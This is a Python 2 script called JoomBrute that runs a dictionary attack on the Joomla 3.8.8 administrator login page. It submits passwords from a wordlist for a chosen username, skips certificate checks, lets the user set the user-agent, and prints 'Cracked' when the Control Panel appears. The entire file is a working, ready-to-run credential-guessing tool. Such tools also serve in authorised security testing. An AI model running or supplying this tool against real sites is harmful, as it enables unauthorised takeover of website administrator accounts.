#/usr/bin/python
# -*- coding: utf-8 -*-
# Joomla (3.8.8) Admin Bruteforcer
# Update: June 14 2018
# Requirements: pip install robobrowser 
# python 2.7

from robobrowser import RoboBrowser
import re,sys,time,argparse,warnings
from random import randint

if not sys.warnoptions:
    warnings.simplefilter("ignore")


print '''
 ▐▄▄▄            • ▌ ▄ ·. ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .
  ·██▪     ▪     ·██ ▐███▪▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·
▪▄ ██ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄
▐▌▐█▌▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌
 ▀▀▀• ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ v.1.0
         Author: Fabrizio Siciliano (@0rbz_)
'''

def ze_args():
    parser = argparse.ArgumentParser(
        description="Joomla Administrator Bruteforcer",
        epilog="Example: python joombrute.py --url http://site/administrator --username user --wordlist passwords.txt")
    parser.add_argument(
        '--url', type=str, help='Target Admin URL, i.e., http://site/administrator', required=True)
    parser.add_argument(
        '--username', type=str, help='User Name', required=True)
    parser.add_argument(
        '--wordlist', type=str, help='Password List', required=True)
    parser.add_argument(
        '--ua', type=str, help='User-Agent', required=False, default="JoomBrute/1.0")

    args = parser.parse_args()

    url = args.url
    username = args.username
    wordlist = args.wordlist
    ua = args.ua
    return url,username,wordlist,ua

url,username,wordlist,ua = ze_args()

class color:
    r = '\033[91m'
    g = '\033[92m'
    y = '\033[93m'
    b = '\033[0m'

try:
    pass_list = open(wordlist, 'r').readlines()
    print '[+] Starting dictionary attack on ' + color.y + url + color.b
    print '[+] Using password wordlist ' + color.y + wordlist + color.b + ' and username ' + color.y + username +'.' + color.b

    time.sleep(3)

except:
    print "[!] Can't find " + wordlist +'.'+  ' Does it exist?'
    sys.exit(1)

def DoTheThing(url,username,list):
    robot = RoboBrowser(history=False,
    user_agent=str(ua))
    robot.open(str(url), verify=False)
    form = robot.get_form()
    form['username'].value = username
    form['passwd'].value = str.strip(list)

    robot.submit_form(form)

    response = robot.find_all(text = re.compile('Control Panel'))
    someText = re.search("Control Panel", str(response))

    if someText:
        goodNews = someText.groups()
        print color.g + "[!] Cracked: " + color.b + username + " : " + str.strip(list)
        print "[+] Finished!"
        sys.exit(1)
    else:
        print color.r + "[*] Trying: " + color.b + username + " : " + str.strip(list)

while True:
    for list in pass_list:
# add some time delay between requests
#        time.sleep(randint(2,5))
        DoTheThing(url,username,list)
    break
